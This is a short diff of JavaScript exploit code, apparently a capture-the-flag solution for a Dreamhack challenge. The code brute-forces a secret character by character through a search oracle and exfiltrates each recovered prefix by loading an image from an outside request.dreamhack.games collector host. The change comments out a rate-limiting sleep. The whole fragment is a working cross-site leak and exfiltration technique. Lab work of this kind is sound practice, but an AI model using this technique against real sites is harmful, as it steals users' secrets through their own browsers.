@@ -32,7 +32,7 @@
 
         while (!secret.includes("}")) {
             for (let c of chars) {
-                await sleep(200);
+                // await sleep(200);
                 if (await search(secret + c)) {
                     secret += c;
                     img.src = `https://${window.location.hash.slice(1)}.request.dreamhack.games/${secret}`;
